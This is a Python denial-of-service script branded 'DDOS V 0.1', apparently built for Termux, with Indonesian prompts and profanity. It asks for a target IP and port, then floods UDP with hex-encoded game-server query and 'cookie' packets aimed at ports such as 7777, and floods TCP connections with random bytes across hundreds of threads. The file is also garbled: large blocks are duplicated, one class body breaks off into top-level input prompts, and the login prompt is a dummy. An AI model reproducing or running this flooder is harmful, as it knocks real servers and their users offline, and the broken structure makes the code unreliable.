import random
import threading
import codecs
import struct
import time
import socket
import sys
import os
import threading    
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = '\033[1;30m'
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
print(b+"""           -o          o-            @localhost
          +hydNNNNdyh+             -----------------
        +mMMMMMMMMMMMMm+          
      `dMMm:NMMMMMMN:mMMd`         
      hMMMMMMMMMMMMMMMMMMh         
  ..  yyyyyyyyyyyyyyyyyyyy  ..    
.mMMm`MMMMMMMMMMMMMMMMMMMM`mMMm.   
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   Terminal: com.termux
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:  
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      `/++MMMMh++hMMMM++/`
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs""")
print('')
print('')
print('')
print(m+'██████╗░██████╗░░█████╗░░██████╗')
print('██╔══██╗██╔══██╗██╔══██╗██╔════╝  SCRIPT BY FQ')
print(h+'██║░░██║██║░░██║██║░░██║╚█████╗░')
print('██║░░██║██║░░██║██║░░██║░╚═══██╗  V 0.1')
print(b+'██████╔╝██████╔╝╚█████╔╝██████╔╝')
print('╚═════╝░╚═════╝░░╚════╝░╚═════╝░')
print(' ')

print(m+'Muach')
print(' ')
print("username: bkp pw:123")

username =input(print( h +'masukan username='))
password =input(print( b +'masukan password= '))

print('___loading___')
print(h +'--10%')
print(k +'---25%')
print(h +'----34%')
print(m +'-----47%')
print(p +'------54%')
print(kk +'-------75%')
print(hh +'--------100%')
print(m + 'selesai')
ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" Do you want to Attack? (y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.send(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			print("[!] Down Kontol!!!")

def run2():
	data = random._urandom(2)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")
def run3():
	data = random._urandom(3)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")
            
  
def run4():
	data = random._urandom(4)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")
			
def run5():
	data = random._urandom(5)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")
            
def run6():
	data = random._urandom(6)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")            
def run7():
	data = random._urandom(7)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")	
			
def run8():
	data = random._urandom(8)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run9():
	data = random._urandom(9)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run10():
	data = random._urandom(10)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run11():
	data = random._urandom(11)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run12():
	data = random._urandom(12)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run13():
	data = random._urandom(13)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run14():
	data = random._urandom(14)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run15():
	data = random._urandom(15)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run16():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run17():
	data = random._urandom(17)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run18():
	data = random._urandom(18)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run19():
	data = random._urandom(19)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
def run20():
	data = random._urandom(20)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Down Kontol!!!")			
			
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()
  
def run4():
	data = random._urandom(4)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")
			
def run5():
	data = random._urandom(5)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")
            
def run6():
	data = random._urandom(6)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")            
def run7():
	data = random._urandom(7)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")	
			
def run8():
	data = random._urandom(8)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run9():
	data = random._urandom(9)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run10():
	data = random._urandom(10)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run11():
	data = random._urandom(11)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run12():
	data = random._urandom(12)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run13():
	data = random._urandom(13)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run14():
	data = random._urandom(14)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run15():
	data = random._urandom(15)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run16():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run17():
	data = random._urandom(17)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run18():
	data = random._urandom(18)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run19():
	data = random._urandom(19)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
def run20():
	data = random._urandom(20)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print(h+" [*] Down!!!")			
			
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     

                
                ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" Do you want to Attack? (y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]


if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()

print('terimakasih sampai jumpa lagi')
exit()
